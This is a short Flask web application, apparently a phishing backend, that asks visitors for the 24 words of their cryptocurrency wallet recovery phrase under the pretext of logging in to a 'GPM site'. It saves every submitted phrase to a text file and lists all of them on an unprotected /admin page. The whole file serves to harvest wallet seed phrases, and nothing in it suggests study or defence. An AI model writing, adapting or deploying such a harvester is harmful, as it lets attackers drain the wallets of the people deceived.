from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/passphrase', methods=['GET'])
def passphrase():
    return render_template('passphrase.html')

@app.route('/submit-passphrase', methods=['POST'])
def submit_passphrase():
    phrase = request.form.get('passphrase', '').strip()
    words = phrase.split()
    
    if len(words) != 24:
        error = "Invalid passphrase, please enter the exactly 24 words of your wallet to login to GPM site"
        return render_template('passphrase.html', error=error, passphrase=phrase)

    with open("passphrases.txt", "a") as f:
        f.write(phrase + "\n")

    return redirect(url_for('home'))

@app.route('/admin')
def admin():
    try:
        with open('passphrases.txt', 'r') as f:
            phrases = f.readlines()
    except FileNotFoundError:
        phrases = []
    formatted_phrases = "<br>".join([p.strip() for p in phrases])
    return f"""
    <html>
    <head><title>Admin - Passphrases</title></head>
    <body style="background-color: #f0f0f0; padding: 20px;">
        <h2 style="text-align: center;">Submitted Passphrases</h2>
        <div style="white-space: pre-wrap; font-family: monospace; margin-top: 20px;">
            {formatted_phrases if phrases else 'No passphrases saved yet.'}
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5080)
